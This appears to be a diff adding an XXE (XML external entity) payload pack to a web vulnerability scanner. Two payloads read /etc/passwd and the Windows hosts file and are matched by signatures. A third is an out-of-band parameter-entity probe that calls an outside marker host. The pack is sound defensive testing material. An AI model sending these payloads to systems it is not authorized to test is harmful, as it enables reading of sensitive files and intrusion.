@@ -1,0 +1,61 @@
+# XXE (XML External Entity) injection.
+#
+# These only apply to POST forms/endpoints that accept a raw XML body
+# (SOAP, XML-RPC, file-upload-as-XML APIs, etc.) -- the `raw_body: true` /
+# `content_type` pack fields tell the tester to send the payload as the
+# literal request body with that Content-Type, instead of substituting it
+# into each discovered form field like the other packs.
+#
+# Detection is signature-based (external entity expansion reflected back in
+# the response), the same technique as the path-traversal pack -- there is
+# no out-of-band/collaborator support in this build, so blind XXE (where
+# the result is exfiltrated via an out-of-band channel instead of being
+# echoed in the response) will not be detected. See docs/cli-surface.md.
+- id: xxe-linux-passwd
+  finding_id: payload-xxe
+  raw_body: true
+  content_type: application/xml
+  severity: critical
+  description: XML external entity payload caused local file contents (/etc/passwd) to be reflected in the response
+  payload: |
+    <?xml version="1.0"?>
+    <!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <data>&xxe;</data>
+  match:
+    any:
+      - body_contains: "root:x:0:0"
+        new_only: true
+- id: xxe-windows-hosts
+  finding_id: payload-xxe
+  raw_body: true
+  content_type: application/xml
+  severity: critical
+  description: XML external entity payload caused local file contents (Windows hosts file) to be reflected in the response
+  payload: |
+    <?xml version="1.0"?>
+    <!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
+    <data>&xxe;</data>
+  match:
+    all:
+      - body_contains: "127.0.0.1"
+        new_only: true
+      - body_contains: "localhost"
+        new_only: true
+- id: xxe-parameter-entity-oob-marker
+  finding_id: payload-xxe-parameter-entity
+  raw_body: true
+  content_type: application/xml
+  severity: medium
+  description: >-
+    Parameter-entity XXE payload targeting a marker host was sent; this
+    tool cannot observe out-of-band DNS/HTTP callbacks, so a lack of a
+    finding here does NOT mean the target is safe -- check your network
+    logs / DNS provider for a lookup of shroodler-oob-test.invalid if you
+    control that infrastructure, or use a real collaborator tool.
+  payload: |
+    <?xml version="1.0"?>
+    <!DOCTYPE data [<!ENTITY % xxe SYSTEM "http://{{MARKER_HOST}}/xxe">%xxe;]>
+    <data>probe</data>
+  match:
+    any:
+      - redirected_to_contains: "shroodler-oob-test.invalid"
